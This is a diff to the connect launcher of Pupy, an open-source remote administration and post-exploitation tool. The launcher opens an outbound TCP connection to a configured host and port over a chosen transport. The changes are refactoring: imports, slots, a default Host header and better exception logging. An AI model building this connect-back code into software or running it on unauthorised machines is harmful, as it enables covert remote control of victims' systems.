@@ -2,12 +2,22 @@
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
+__all__ = [ 'ConnectLauncher' ]
+
+import network
+import argparse
+import logging
+
+from network.lib import utils
+
 from ..base_launcher import *
 
 class ConnectLauncher(BaseLauncher):
     """ simple launcher that uses TCP connect with a chosen transport """
 
     credentials = [ 'SSL_BIND_CERT' ]
+
+    __slots__ = ( 'credentials', 'arg_parser', 'args', 'rhost', 'rport', 'connect_on_bind_payload' )
 
     def __init__(self, *args, **kwargs):
         self.connect_on_bind_payload=kwargs.pop("connect_on_bind_payload", False)
@@ -22,7 +32,7 @@ class ConnectLauncher(BaseLauncher):
         self.args=self.arg_parser.parse_args(args)
         self.rhost, self.rport=None,None
         self.parse_host(self.args.host[0])
-    
+
     def parse_host(self, host):
         tab=host.rsplit(":",1)
         self.rhost=tab[0]
@@ -39,11 +49,18 @@ class ConnectLauncher(BaseLauncher):
         for current_host in self.args.host:
             self.parse_host(current_host)
             try:
-                logging.info("connecting to %s:%s using transport %s ..."%(self.rhost, self.rport, self.args.transport))
+                logging.info("connecting to %s:%s using transport %s ..."%(
+                    self.rhost, self.rport, self.args.transport))
                 opt_args=utils.parse_transports_args(' '.join(self.args.transport_args))
                 t=network.conf.transports[self.args.transport](bind_payload=self.connect_on_bind_payload)
                 client_args=t.client_kwargs
                 transport_args=t.client_transport_kwargs
+
+                if 'host' in transport_args and not 'host' in opt_args:
+                    transport_args['host'] = '{}{}'.format(
+                        self.rhost, ':{}'.format(self.rport) if self.rport != 80 else ''
+                    )
+
                 for val in opt_args:
                     if val.lower() in t.client_kwargs:
                         client_args[val.lower()]=opt_args[val]
@@ -51,6 +68,7 @@ class ConnectLauncher(BaseLauncher):
                         transport_args[val.lower()]=opt_args[val]
                     else:
                         logging.warning("unknown transport argument : %s"%val)
+
                 logging.info("using client options: %s"%client_args)
                 logging.info("using transports options: %s"%transport_args)
                 try:
@@ -67,5 +85,4 @@ class ConnectLauncher(BaseLauncher):
                 stream = t.stream(s, t.client_transport, t.client_transport_kwargs)
                 yield stream
             except Exception as e:
-                logging.info(e)
-                    
+                logging.exception(e)
